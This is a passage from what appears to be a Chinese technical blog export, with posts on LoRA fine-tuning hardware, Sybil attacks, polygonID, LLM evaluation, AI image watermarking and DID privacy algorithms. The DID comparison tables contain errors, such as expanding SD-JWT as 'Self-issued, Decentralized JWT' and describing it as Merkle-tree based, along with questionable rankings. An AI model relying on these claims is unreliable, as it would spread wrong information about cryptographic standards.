<li>表格中所有基于 Unsloth 的配置方案都假设使用 LoRA 微调。LoRA 本身就是一种参数高效微调方法，可以显著减少需要训练的参数量，从而降低显存需求和加速训练。</li>
<li>Unsloth 进一步优化了 LoRA 的实现，使其在速度和显存效率方面更具优势。</li>
</ul>
</li>
<li><strong>FlashAttention-2 的加速作用</strong>:<ul>
<li>Unsloth 集成的 FlashAttention-2 可以显著加速训练过程，这有助于在 “日内完成微调” 的目标下，使用更少的 GPU 资源。</li>
</ul>
</li>
</ol>
<h2 id="关键分析逻辑"><a href="#关键分析逻辑" class="headerlink" title="关键分析逻辑"></a>关键分析逻辑</h2><ol>
<li>模型参数量 vs. GPU 显存:<ul>
<li>参数高效<strong>微调 (如 LoRA) 显著降低了显存需求</strong>，公式估算如下： $$ \text{显存} \approx \text{模型参数} \times (2\ \text{bytes} \times \text{激活系数}) + \text{优化器状态} $$ 其中，激活系数在 LoRA 场景下约为 0.1-0.3，优化器状态通过 ZeRO-3 等技术可以大幅减少。</li>
</ul>
</li>
<li>数据量 vs. 训练并行度:<ul>
<li>小数据量 (1K, 1M): 资源需求主要由模型大小决定。较小的 Distill 模型甚至可以在单张消费级 GPU 上完成微调。</li>
<li>大数据量 (1G, 1T): 数据并行成为关键。需要增加 GPU 数量以提高数据吞吐量，并配合高速网络 (如 RDMA) 保证并行效率。</li>
</ul>
</li>
<li>训练时长与硬件资源:<ul>
<li>表格中的配置旨在将微调时间压缩到 <strong>一天以内</strong>。更快的训练速度通常需要更多的 GPU 资源并行计算。</li>
<li>实际训练时间还会受到 <strong>模型结构</strong>、<strong>超参数设置</strong>、<strong>优化算法</strong> 等多种因素影响。上述表格提供的是一个 <strong>硬件配置参考</strong>，实际部署时可能需要根据具体情况进行调整。</li>
</ul>
</li>
<li>优化技术:<ul>
<li>混合精度训练 (BF16/FP16): 降低显存占用和计算复杂度，加速训练过程。</li>
<li>梯度检查点: 通过计算换取显存，进一步降低显存峰值。</li>
<li>ZeRO-3: 将优化器状态、梯度和模型参数分片到多张 GPU 上，极大地减少单卡显存需求，尤其适用于超大模型 (如 671B)。</li>
<li>模型并行 (Tensor Parallelism, TP): 将模型按层或张量切分到多张 GPU 上，降低单卡显存压力，适用于超大模型。</li>
<li>数据并行 (Data Parallelism, DP): 将数据分片到多张 GPU 上，每张 GPU 训练模型完整副本的一部分数据，提高数据吞吐量，适用于大数据量训练。</li>
<li>梯度累积: 在显存受限时，通过多次小批量梯度计算累积梯度，模拟大批量训练的效果。</li>
</ul>
</li>
<li>网络与存储:<ul>
<li><strong>RDMA 网络</strong>: 对于大规模分布式训练 (尤其是模型并行和数据并行结合)，RDMA 网络可以显著降低 GPU 间通信延迟，提高并行效率。</li>
<li>高速 SSD/NVMe 存储: 大数据量训练时，高速存储可以加速数据加载，避免 I/O 瓶颈。</li>
</ul>
</li>
</ol>
<p><strong>请注意:</strong></p>
<ul>
<li>上述表格提供的是 <strong>估算和建议</strong>，实际资源需求可能因具体任务和实现细节有所不同。</li>
<li>在实际部署时，建议 <strong>从小规模配置开始测试</strong>，并根据训练速度和资源利用率逐步调整硬件配置。</li>
<li>云服务平台通常提供多种 GPU 实例和高速网络配置，可以根据表格中的建议选择合适的云资源进行模型微调。</li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>女巫攻击Sybil_Attack</title>
    <url>/2018/07/14/%E5%A5%B3%E5%B7%AB%E6%94%BB%E5%87%BBSybil-Attack/</url>
    <content><![CDATA[<h3 id="什么是女巫攻击？"><a href="#什么是女巫攻击？" class="headerlink" title="什么是女巫攻击？"></a>什么是女巫攻击？</h3><blockquote>
<p>在对等网络中，但节点通常具有多个身份标识，通过控制系统的大部分节点来消弱冗余备份的作用。</p>
</blockquote>
<h3 id="八卦一下这个名字的来路："><a href="#八卦一下这个名字的来路：" class="headerlink" title="八卦一下这个名字的来路："></a>八卦一下这个名字的来路：</h3><blockquote>
<p>根据 Flora Rhea Schreiberie 在1973年的小说《女巫》（Sybil）改编的同名电影，是一个化名 Sybil Dorsett 的女人心理治疗的故事。她被诊断为分离性身份认同障碍，兼具16种人格。</p>
</blockquote>
<p>女巫攻击是在P2P网络中，因为节点随时加入退出等原因，为了维持网络稳定，同一份数据通常需要备份到多个分布式节点上，这就是数据冗余机制。女巫攻击是攻击数据冗余机制的一种有效手段。</p>
<p>如果网络中存在一个恶意节点，那么同一个恶意节点可以具有多重身份，就如电影的女主角都可以分裂出16个身份，那么恶意节点比女猪脚更加分裂。这一分可好，原来需要备份到多个节点的数据被欺骗地备份到了同一个恶意节点（该恶意节点伪装成多重身份），这就是女巫攻击。</p>
<h3 id="怎么解决女巫攻击？"><a href="#怎么解决女巫攻击？" class="headerlink" title="怎么解决女巫攻击？"></a>怎么解决女巫攻击？</h3><p>一种方法是工作量证明机制，即证明你是一个节点，别只说不练，而是要用计算能力证明，这样极大地增加了攻击的成本。</p>
<p>另一种方法是身份认证（相对于PoW协议，女巫攻击是基于BFT拜占庭使用容错协议的Blockchain需要考虑的问题，需要采用相应的身份认证机制）。</p>
<p>认证机制分为二类：</p>
<p>1）基于第三方的身份认证</p>
<p>每加入一个新的节点都需要与某一个可靠的第三方节点进行身份验证。</p>
<p>2）纯分布式的身份认证</p>
<p>每加入一个新的节点都需要获得当前网络中所有可靠节点的认证，这种方法采用了随机密钥分发验证的公钥体制的认证方式，需要获得网络中大多数节点的认证才能加入该网络。</p>
]]></content>
      <tags>
        <tag>共识算法</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用polygonID</title>
    <url>/2024/02/20/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8polygonID/</url>
    <content><![CDATA[<p>继续前序学习的DID产品，关于polygonID的进一步学习，本文介绍如何使用polygonID。<br>前序文章：</p>
<ul>
<li><a href="https://willzhuang.github.io/2023/11/15/iden3%E5%92%8CpolygonID%E5%8E%9F%E7%90%86%E5%BA%94%E7%94%A8%E5%92%8C%E5%AE%9E%E6%88%98/">iden3和polygonID原理应用和实战</a></li>
<li><a href="https://willzhuang.github.io/2023/11/22/polygonID%20SDK%E9%83%A8%E5%88%86%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">polygonID SDK部分代码分析</a><br><a href="https://github.com/0xPolygonID/issuer-node/">polygonID Issuer-Node</a> 启动以后，有2台 docker container 服务器运行，1) Issuer Node API; 2) Issuer Node UI。这两个服务都有各自的 API 给到前端 - 手机App 或者 Web site调用。<br>其中，</li>
<li>Issuer Node API是文档中<a href="https://devs.polygonid.com/docs/issuer-node/issuer-node-api/introduction"> Issuer Node Core API </a>的部分。</li>
<li>Issuer Node UI API 是文档中<a href="https://devs.polygonid.com/docs/issuer/issuer-node-ui"> Issuer Node UI </a>的部分。<br>Issuer Node API只是在 Issuer-Node 启动时，调用一次，用来为 Issuer 生成 DID，其后不再被直接调用。前端应用调用API是调用 Issuer Node UI API。关于 Issuer Node UI API 的文档目前是<a href="https://www.postman.com/dark-star-200015/workspace/public/folder/23322631-5f8ec341-42b9-44e5-ac45-f1ed8966bd4c">在 Postman 中</a>。其中：<ul>
<li>Credential - VC创建，取得，删除，作废，取得状态。</li>
<li>Auth - 鉴权 QR Code。即 Link 地址对应的 QR Code。</li>
<li>Connection - 如文档所示( <a href="https://devs.polygonid.com/docs/issuer-node/issuer-node-guide/">https://devs.polygonid.com/docs/issuer-node/issuer-node-guide/</a> )，Connection 展示 ID Holders 和 Credentials 的所属关系。</li>
<li>Schema - 生成 VC 所使用的数据字段管理。</li>
<li>State - 管理 Identity State，取得，公开至区块链。</li>
<li>Link - 通过 link，进入VC。Link创建，取得，删除，失效，创建鉴权，和取得QR Code。</li>
</ul>
</li>
</ul>
]]></content>
      <tags>
        <tag>DID</tag>
      </tags>
  </entry>
  <entry>
    <title>如何测评大语言模型</title>
    <url>/2023/10/13/%E5%A6%82%E4%BD%95%E6%B5%8B%E8%AF%84%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p>大语言模型的评测方法是一个热门的研究话题，目前还没有一个统一的标准。不同的评测方法可能侧重于不同的方面，例如语言模型的生成能力、理解能力、泛化能力、对抗能力等。</p>
<h3 id="一些常见的评测方法有："><a href="#一些常见的评测方法有：" class="headerlink" title="一些常见的评测方法有："></a>一些常见的评测方法有：</h3><ul>
<li><strong>困惑度（Perplexity）</strong>：困惑度是一种衡量语言模型预测下一个词的准确性的指标，它反映了语言模型对文本的复杂度的估计。困惑度越低，说明语言模型越能够准确地预测下一个词，越能够流畅地生成文本。困惑度的计算公式是<br>$$PPL(W)= \exp \Big(− \frac{1}{N}​ \sum_{i=1}^{N} \log p(w_i​|w_{&lt;i​}) \Big)$$<br> 其中 W 是一个文本序列，N 是序列的长度，p(wi​ | w&lt;i​) 是语言模型给出的第 i 个词的条件概率。</li>
<li><strong>自动评价指标（Automatic Metrics）</strong>：自动评价指标是一种利用已有的参考文本来评价语言模型生成文本的质量的方法，它主要考察生成文本和参考文本之间的相似度。常用的自动评价指标有 <strong>BLEU</strong>、<strong>ROUGE</strong>、<strong>METEOR</strong>、<strong>BERTScore</strong> 等。这些指标通常基于词汇、语法、语义等层面来计算生成文本和参考文本之间的匹配程度，但是它们也存在一些局限性，例如忽略了生成文本的流畅性、逻辑性、创造性等方面。</li>
<li><strong>人工评价指标（Human Metrics）</strong>：人工评价指标是一种通过人类评估员来评价语言模型生成文本的质量的方法，它主要考察生成文本是否符合人类的期望和偏好。人工评价指标通常涉及多个维度，例如 <strong>流畅性（Fluency）</strong>、<strong>一致性（Consistency）</strong>、<strong>相关性（Relevance）</strong>、<strong>多样性（Diversity）</strong>、<strong>正确性（Correctness）</strong> 等。人工评价指标可以更好地反映生成文本的真实水平，但是它们也存在一些问题，例如成本高、效率低、主观性强等。</li>
</ul>
<h3 id="相关的论文如下："><a href="#相关的论文如下：" class="headerlink" title="相关的论文如下："></a>相关的论文如下：</h3><p><a href="https://arxiv.org/abs/2102.04664">CodeXGLUE: A Benchmark Dataset and Open Challenge for Code Intelligence</a><br>[Storyline: A Benchmark Dataset for Story Understanding and Generation]<br><a href="https://arxiv.org/abs/2009.02252">KILT: a Benchmark for Knowledge Intensive Language Tasks</a></p>
<h3 id="思考问题："><a href="#思考问题：" class="headerlink" title="思考问题："></a>思考问题：</h3><ul>
<li>以上论文均基于特定数据集，特定场景，给出的特定的测试结果（Metrics），相对的人类用户使用时的感受还有较大的差距。</li>
<li>人工测评的话，成本高、效率低、主观性强。特定用户群很可能产生不同的测评结果。</li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>如何在ubuntu中使用make</title>
    <url>/2020/07/07/%E5%A6%82%E4%BD%95%E5%9C%A8ubuntu%E4%B8%AD%E4%BD%BF%E7%94%A8make/</url>
    <content><![CDATA[<p>Run the command:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<p>Chances are you will need things like <code>gcc</code> to actually do the building so you might as well install those as well. The <code>build-essential</code> package will install other tools used along with <code>make</code>.</p>
]]></content>
      <tags>
        <tag>Infrastructure</tag>
      </tags>
  </entry>
  <entry>
    <title>如何添加水印和识别AI生成的图像</title>
    <url>/2023/10/11/%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0%E5%92%8C%E8%AF%86%E5%88%ABAI%E7%94%9F%E6%88%90%E7%9A%84%E5%9B%BE%E5%83%8F/</url>
    <content><![CDATA[<p>人工智能生成的图像每天都变得越来越流行。 但我们如何才能更好地识别它们，尤其是当它们看起来如此逼真时？</p>
<h3 id="1-SynthID"><a href="#1-SynthID" class="headerlink" title="1. SynthID"></a>1. SynthID</h3><p>产品介绍 - <a href="https://www.deepmind.com/synthid">https://www.deepmind.com/synthid</a><br>产品博客 - <a href="https://www.deepmind.com/blog/identifying-ai-generated-images-with-synthid">https://www.deepmind.com/blog/identifying-ai-generated-images-with-synthid</a><br>SynthID 正在使用 <a href="https://imagen.research.google/">Imagen</a> 向 <a href="https://cloud.google.com/vertex-ai">Vertex AI</a> 客户发布，<a href="https://imagen.research.google/">Imagen</a> 是GCP最新的文本到图像模型之一，使用输入文本创建逼真的图像。<br>通过这个工具，用户可以将难以察觉的数字水印嵌入到人工智能生成的图像中，并识别 Imagen 是否用于生成图像，甚至是图像的一部分。<br>SynthID 由 Google DeepMind 开发，并与 Google Research 合作完善。SynthID 并不能万无一失地抵御极端图像处理，但它确实提供了一种有前途的技术方法，使人们和组织能够负责任地使用人工智能生成的内容。该工具还可以与音频、视频和文本等图像之外的其他人工智能模型和模式一起发展。<br>传统水印不足以识别人工智能生成的图像，因为它们通常像图像上的图章一样应用，并且很容易被编辑掉。例如，可以使用基本编辑技术剪掉图像角落中发现的离散水印。<br>在图像处理的不可察觉性和鲁棒性之间找到适当的平衡是很困难的。高度可见的水印通常作为带有名称或徽标的图层添加在图像顶部，也给创意或商业目的带来了审美挑战。同样，一些以前开发的难以察觉的水印可能会通过简单的编辑技术（例如调整大小）丢失。<br>SynthID 不会影响图像质量，并且即使在添加滤镜、更改颜色以及使用各种有损压缩方案（最常用于 JPEG）进行保存等修改之后，水印仍可被检测到。<br>SynthID 使用两种深度学习模型（用于水印和识别），这两种模型已在不同的图像集上一起进行训练。 组合模型针对一系列目标进行了优化，包括正确识别带水印的内容以及通过在视觉上将水印与原始内容对齐来提高不可察觉性。<br>SynthID 允许 Vertex AI 客户负责任地创建 AI 生成的图像并自信地识别它们。 虽然这项技术并不完美，但我们的内部测试表明它对于许多常见的图像处理来说是准确的。</p>
<ul>
<li>SynthID的组合方法：<br>水印：SynthID 可以为 Imagen 生成的合成图像添加难以察觉的水印。‍<br>识别：通过扫描图像中的数字水印，SynthID 可以评估 Imagen 创建图像的可能性。<br>但是该软件没有开源，也没有具体实现原理的介绍。其原理可能与 Stable Signature 一致，请继续阅读下文。</li>
</ul>
<h3 id="2-Stable-Signature"><a href="#2-Stable-Signature" class="headerlink" title="2. Stable Signature"></a>2. Stable Signature</h3><p>开源代码 - <a href="https://github.com/facebookresearch/stable_signature">https://github.com/facebookresearch/stable_signature</a><br>项目论文 - <a href="https://arxiv.org/abs/2303.15435">https://arxiv.org/abs/2303.15435</a><br>Official implementation of the paper “The Stable Signature Rooting Watermarks in Latent Diffusion Models”。在本论文中，作者提出了一种稳定签名的策略，该策略结合了图像水印和潜在扩散模型，以确保生成图像建模的负责任部署。该方法可以快速微调图像生成器的潜在解码器，以在所有生成的图像中隐藏一个不可见的水印，以供未来检测和识别。<br>实现的能力和 SynthID 项目的描述是一样一样的。<br>具体实现方法大体有下面<a href="https://arxiv.org/abs/2303.15435">3个步骤（取于论文）</a>：<br><img src="/2023/10/11/%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E6%B0%B4%E5%8D%B0%E5%92%8C%E8%AF%86%E5%88%ABAI%E7%94%9F%E6%88%90%E7%9A%84%E5%9B%BE%E5%83%8F/1.png"></p>
<h3 id="思考问题："><a href="#思考问题：" class="headerlink" title="思考问题："></a>思考问题：</h3><ul>
<li>如果 hacker 通过拷贝屏幕的方式复制图片，如何能够防止，杜绝，或者得到惩罚呢？</li>
<li>经过加密的图片，质量会发生些微的损失。如 Stable Signature 论文所讲，根据经验，在不影响图像质量的情况下，显着降低位精度是很困难的：在纯化过程中开始出现伪影。如何保护图片质量，也是进一步的问题。<a href="https://www.chatpdf.com/">chatPDF回答</a>：在本论文中，作者提出了一种权衡图像质量和水印鲁棒性的方法，可以通过调整感知损失的权重来实现。较高的感知损失权重会导致更接近原始图像的图像，但提取的水印的位准确性会降低。因此，可以根据具体需求来选择权衡图像质量和水印鲁棒性的方法。</li>
<li>实验和方法的成本很高，尽管比其他计算机视觉领域要低几个数量级。 我们粗略估计用于运行所有实验的总 GPU 天数为 2000，即 ≈ 50000 GPU 小时。 这相当于 10 吨二氧化碳当量的总排放量。</li>
<li>如此方法，引申至3D模型，动画，视频，是否可以重用，目前看还需要思考。</li>
</ul>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>加密</tag>
      </tags>
  </entry>
  <entry>
    <title>对比DID中的隐私算法</title>
    <url>/2024/05/16/%E5%AF%B9%E6%AF%94DID%E4%B8%AD%E7%9A%84%E9%9A%90%E7%A7%81%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h3 id="SD-JWT"><a href="#SD-JWT" class="headerlink" title="SD-JWT:"></a>SD-JWT:</h3><p><a href="https://datatracker.ietf.org/doc/draft-ietf-oauth-selective-disclosure-jwt/">https://datatracker.ietf.org/doc/draft-ietf-oauth-selective-disclosure-jwt/</a><br><a href="https://github.com/eu-digital-identity-wallet/eudi-lib-jvm-sdjwt-kt">https://github.com/eu-digital-identity-wallet/eudi-lib-jvm-sdjwt-kt</a></p>
<h4 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现:"></a>算法实现:</h4><ol>
<li>数据封装:<ul>
<li>数据被封装在JWT中，包含需要选择性披露的声明（claims）。</li>
<li>每个声明都可以独立加密或哈希处理。</li>
</ul>
</li>
<li>Merkle树结构:<ul>
<li>为所有声明构建一个Merkle树，每个叶子节点代表一个哈希后的声明。</li>
<li>通过哈希值的组合，形成父节点，直到生成一个根哈希值（root hash）。</li>
</ul>
</li>
<li>签名:<ul>
<li>使用私钥对整个JWT（包括Merkle树的根哈希值）进行签名。</li>
<li>签名确保数据的完整性和真实性。</li>
</ul>
</li>
<li>选择性披露:<ul>
<li>用户可以选择性地披露特定的声明，并提供相应的Merkle证明（包含所需的兄弟节点哈希）。</li>
<li>验证者使用Merkle证明验证特定声明是否属于原始数据。<br>关键技术:</li>
</ul>
</li>
</ol>
<ul>
<li>JWT</li>
<li>Merkle树</li>
<li>数字签名</li>
</ul>
<h3 id="BBS-Signature"><a href="#BBS-Signature" class="headerlink" title="BBS Signature:"></a>BBS Signature:</h3><h4 id="算法实现-1"><a href="#算法实现-1" class="headerlink" title="算法实现:"></a>算法实现:</h4><ol>
<li>签名生成:<ul>
<li>生成密钥对（私钥和公钥）。</li>
<li>使用私钥对消息进行签名，生成一个签名值。</li>
</ul>
</li>
<li>选择性披露:<ul>
<li>允许用户选择性披露部分数据，并生成零知识证明（ZKP），证明所披露的数据是原始数据的一部分。</li>
</ul>
</li>
<li>验证:<ul>
<li>验证者使用公钥和零知识证明，验证所披露的数据的真实性和完整性。</li>
<li>确保签名和数据未被篡改。<br>关键技术:</li>
</ul>
</li>
</ol>
<ul>
<li>零知识证明</li>
<li>数字签名</li>
<li>椭圆曲线密码学</li>
</ul>
<h3 id="BBS-Signature-1"><a href="#BBS-Signature-1" class="headerlink" title="BBS+ Signature:"></a>BBS+ Signature:</h3><p><a href="https://github.com/mattrglobal/bbs-signatures">https://github.com/mattrglobal/bbs-signatures</a><br><a href="%E5%AF%B9%E6%AF%94DID%E4%B8%AD%E7%9A%84%E9%9A%90%E7%A7%81%E7%AE%97%E6%B3%95/slides-114-cfrg-bbs-signature-scheme-pdf-00.pdf">Org BBS+ Signature algorithm PPT</a>: <a href="https://datatracker.ietf.org/meeting/114/materials/slides-114-cfrg-bbs-signature-scheme-pdf-00">https://datatracker.ietf.org/meeting/114/materials/slides-114-cfrg-bbs-signature-scheme-pdf-00</a><br><a href="https://github.com/decentralized-identity/bbs-signature">https://github.com/decentralized-identity/bbs-signature</a><br><a href="https://github.com/microsoft/bbs-node-reference">https://github.com/microsoft/bbs-node-reference</a></p>
<h4 id="算法实现-2"><a href="#算法实现-2" class="headerlink" title="算法实现:"></a>算法实现:</h4><ol>
<li>优化签名生成:<ul>
<li>基于BBS签名算法，增加了对复杂电路和多项声明的支持。</li>
<li>使用私钥对多个声明进行签名，生成一个增强的签名值。</li>
</ul>
</li>
<li>增强的选择性披露:<ul>
<li>允许用户更高效地选择性披露部分数据，并生成更高效的零知识证明。</li>
<li>增强了对复杂数据结构和大规模应用的支持。</li>
</ul>
</li>
<li>高效验证:<ul>
<li>验证者使用公钥和优化后的零知识证明，验证所披露的数据的真实性和完整性。</li>
<li>验证过程经过优化，提高了性能和效率。<br>关键技术:</li>
</ul>
</li>
</ol>
<ul>
<li>优化的零知识证明</li>
<li>数字签名</li>
<li>高效验证算法</li>
</ul>
<h3 id="PolygonID"><a href="#PolygonID" class="headerlink" title="PolygonID:"></a>PolygonID:</h3><p><a href="https://github.com/0xPolygonID/issuer-node">https://github.com/0xPolygonID/issuer-node</a></p>
<h4 id="zkSNARK"><a href="#zkSNARK" class="headerlink" title="zkSNARK"></a>zkSNARK</h4><p><a href="https://github.com/iden3/snarkjs">https://github.com/iden3/snarkjs</a> (Groth16, PLONK, FFLONK三种算法可选)</p>
<h4 id="主要步骤"><a href="#主要步骤" class="headerlink" title="主要步骤:"></a>主要步骤:</h4><ol>
<li>设置（Setup）:<ul>
<li>生成一组公共参数（公共参考字符串CRS），包括两个部分：证明密钥（proving key）和验证密钥（verifying key）。公共参数由一个复杂的数学过程生成，通常基于椭圆曲线和配对。</li>
<li>这个过程涉及一个可信的第三方，确保公共参数的安全生成。</li>
</ul>
</li>
<li>证明生成（Proving）:<ul>
<li>证明者使用具体的输入（满足某个电路或逻辑条件）和证明密钥生成一个简洁的证明（Proof）。</li>
<li>该证明由少量的群元素组成，可以非常高效地传输和存储。</li>
</ul>
</li>
<li>验证（Verification）:<ul>
<li>验证者使用验证密钥验证证明的有效性，确保输入满足声明的逻辑条件。</li>
<li>通过检查一个简单的数学等式，只需检查少量计算，验证过程快速且高效。</li>
</ul>
</li>
</ol>
<p>SD-JWT（Self-issued, Decentralized JWT）、BBS+ Signature（BlsBBSIG-based Signature）和 PolygonID 是与去中心化身份（DID）相关的不同技术或概念。为了比较它们在DID应用中的适用性，我们可以考虑几个关键维度，如安全性、隐私性、易用性、互操作性和可扩展性。以下是对这些技术的比较，以及它们在DID应用中的评级：</p>
<table>
<thead>
<tr>
<th>特点</th>
<th>SD-JWT</th>
<th>BBS</th>
<th>BBS+</th>
<th>PolygonID</th>
</tr>
</thead>
<tbody><tr>
<td><strong>发明时间</strong></td>
<td>2022</td>
<td>2004</td>
<td>2008</td>
<td>2012,<br>2016</td>
</tr>
<tr>
<td><strong>标准链接</strong></td>
<td><a href="https://github.com/oauth-wg/oauth-selective-disclosure-jwt">oauth-selective-disclosure-jwt</a></td>
<td><a href="https://crypto.stanford.edu/~xb/crypto04a/groupsigs.pdf">Short Group Signatures</a></td>
<td><a href="https://eprint.iacr.org/2008/136.pdf">Constant-Size Dynamic k-TAA</a></td>
<td><a href="https://iacr.org/archive/asiacrypt2010/6477343/6477343.pdf">Short Non-Interactive Zero-Knowledge Proofs</a><br><a href="https://eprint.iacr.org/2016/260">On the Size of Pairing-based Non-interactive Arguments</a></td>
</tr>
<tr>
<td><strong>基本概念</strong></td>
<td>基于JWT的选择性披露和加密技术，用于去中心化身份管理</td>
<td>基于BLS签名的短群签名方案</td>
<td>BBS的改进版，提供更强的隐私性和安全性</td>
<td>基于Polygon网络的去中心化身份解决方案。零知识简洁非交互性知识论证，基于数学证明</td>
</tr>
<tr>
<td><strong>选择性披露</strong></td>
<td>支持，使用Merkle树和加密技术</td>
<td>支持，通过零知识证明实现</td>
<td>更高效和灵活的选择性披露</td>
<td>支持，使用zk-SNARKs技术实现</td>
</tr>
<tr>
<td><strong>零知识证明</strong></td>
<td>基本支持，通过Merkle树结构和证明</td>
<td>支持，通过零知识证明协议</td>
<td><strong>增强支持</strong>，优化了零知识证明性能</td>
<td><strong>强大支持</strong>，通过zk-SNARKs实现</td>
</tr>
<tr>
<td><strong>隐私保护</strong></td>
<td>高，允许选择性披露特定声明而不泄露完整数据</td>
<td>高，通过选择性披露和零知识证明保护隐私</td>
<td>更高，优化选择性披露和零知识证明实现，性能高效，应用灵活</td>
<td><strong>极高</strong>，通过zk-SNARKs和去中心化验证实现</td>
</tr>
<tr>
<td><strong>性能</strong></td>
<td>中等，受Merkle树结构影响</td>
<td>高效，适用于大规模验证</td>
<td>优异，优化了签名和验证过程</td>
<td>优秀，但证明生成计算量大，验证效率高</td>
</tr>
<tr>
<td><strong>互操作性</strong></td>
<td>高，与现有的JWT标准兼容</td>
<td>需要更多集成工作，适用于专用系统</td>
<td>类似BBS，但更优化</td>
<td>高，与以太坊和其他EVM兼容区块链互操作</td>
</tr>
<tr>
<td><strong>应用场景</strong></td>
<td>可验证凭证、教育认证等</td>
<td>DID系统中的隐私保护凭证、去中心化身份验证</td>
<td>高级DID系统、隐私保护凭证、复杂零知识证明环境</td>
<td>高度隐私保护应用，如身份验证、金融交易，如DeFi、NFT、DID管理等</td>
</tr>
<tr>
<td><strong>落地项目</strong></td>
<td><a href="https://trinsic.id/">Trinsic</a>, <strong><a href="https://github.com/eu-digital-identity-wallet">European Digital Identity</a></strong></td>
<td></td>
<td>Hyperledger Indy, Hyperledger Aries</td>
<td><a href="https://www.polygonid.com/">PolygonID</a>, <a href="https://github.com/iden3/snarkjs">snarkjs</a>, <a href="https://github.com/iden3/rapidsnark">rapidsnark</a></td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td>高，基于哈希函数和加密技术</td>
<td>高，基于BLS签名，提供了良好的安全性</td>
<td>更高，基于优化的配对密码学和零知识证明，提供了抗密钥泄露的安全性</td>
<td>极高，基于复杂数学证明，难以破解</td>
</tr>
<tr>
<td><strong>抗量子性</strong></td>
<td>低，当前加密技术未明确抗量子</td>
<td>低，对量子计算较为脆弱</td>
<td>低，与BBS相似，对量子计算较为脆弱</td>
<td>低，大多数现有的zk-SNARKs对量子计算不具备抗性</td>
</tr>
<tr>
<td><strong>易用性</strong></td>
<td>高，易于实现和集成</td>
<td>中等，需要深入的密码学知识</td>
<td>中等，需要理解优化的密码学原理</td>
<td>中等，需掌握复杂数学和密码学知识，开发和验证较为复杂，PolygonID 简化了使用的复杂性</td>
</tr>
<tr>
<td><strong>可扩展性</strong></td>
<td>中等，受限于Merkle树的复杂度和数据大小</td>
<td>高，可扩展到大规模验证环境。签名的大小相对较大，随着消息块的增加，签名大小也增加。</td>
<td>高，优化后适用于大规模应用和验证。签名大小显著减小，且长度固定</td>
<td>高，验证效率高，但证明生成需大量计算资源，Polygon 网络设计可用于处理高交易量</td>
</tr>
</tbody></table>
<h3 id="Groth16-PLONK-和-FFLONK-在PolygonID中的应用"><a href="#Groth16-PLONK-和-FFLONK-在PolygonID中的应用" class="headerlink" title="Groth16, PLONK 和 FFLONK 在PolygonID中的应用"></a>Groth16, PLONK 和 FFLONK 在PolygonID中的应用</h3><table>
<thead>
<tr>
<th>特点</th>
<th><a href="https://eprint.iacr.org/2016/260">Groth16</a></th>
<th><a href="https://github.com/AztecProtocol/barretenberg">PLONK Implementation</a><br><a href="https://eprint.iacr.org/2019/953.pdf">PLONK paper</a></th>
<th><a href="https://eprint.iacr.org/2021/1167.pdf">FFLONK</a></th>
</tr>
</thead>
<tbody><tr>
<td><strong>发明年</strong></td>
<td>2016</td>
<td>2019</td>
<td>2021</td>
</tr>
<tr>
<td><strong>基本概念</strong></td>
<td>基于零知识简洁非交互性知识论证，主要用于隐私保护</td>
<td>高效零知识证明系统，适用于去中心化应用</td>
<td>进一步优化的PLONK，专注于提高性能和验证效率</td>
</tr>
<tr>
<td><strong>证明生成时间</strong></td>
<td>较长，适合复杂证明</td>
<td>快速，适用于高频次证明生成</td>
<td><strong>更快速，优化后的证明生成时间</strong></td>
</tr>
<tr>
<td><strong>验证时间</strong></td>
<td>快速，但略慢于PLONK</td>
<td>快速，验证时间较短</td>
<td>更快速，优化后的验证时间</td>
</tr>
<tr>
<td><strong>计算资源需求</strong></td>
<td>较高，可能需要更多计算资源</td>
<td>中等，适合大多数硬件环境</td>
<td>低，优化后的算法减少计算资源需求</td>
</tr>
<tr>
<td><strong>证明大小</strong></td>
<td>较大，增加存储成本</td>
<td>较小，适合链上存储，减少存储成本</td>
<td>最小，<strong>极大减少存储需求</strong></td>
</tr>
<tr>
<td><strong>可信设置</strong></td>
<td>每个电路需要单独的可信设置</td>
<td>一次可信设置，可重复使用</td>
<td>一次可信设置，可重复使用</td>
</tr>
<tr>
<td><strong>灵活性</strong></td>
<td>较低，需要为特定电路优化</td>
<td>高，支持复杂电路和应用</td>
<td>高，适用于多种应用场景</td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td>高，基于配对和复杂数学难题</td>
<td>高，基于多项式数学难题</td>
<td>更高，基于优化的数学基础</td>
</tr>
<tr>
<td><strong>用户体验</strong></td>
<td>设置复杂且生成时间较长，用户体验较差</td>
<td>简化设置过程和快速验证，提供良好用户体验</td>
<td>优化的性能和简化的设置过程，<strong>用户体验最佳</strong></td>
</tr>
<tr>
<td><strong>适用场景</strong></td>
<td>适用于特定需求明确且不需频繁更新的场景</td>
<td>适用于高频交互和高性能需求的应用</td>
<td>适用于各种高效、高频次的零知识证明应用场景</td>
</tr>
<tr>
<td><strong>在PolygonID中的应用</strong></td>
<td>适用于复杂隐私保护和金融交易场景</td>
<td>适用于实时身份验证和高频交易</td>
<td>适用于高效、高频次的身份验证和隐私保护场景</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>DID</tag>
        <tag>密码学</tag>
        <tag>加密</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>小文件存储系统seaweedfs</title>
    <url>/2020/04/16/%E5%B0%8F%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9Fseaweedfs/</url>
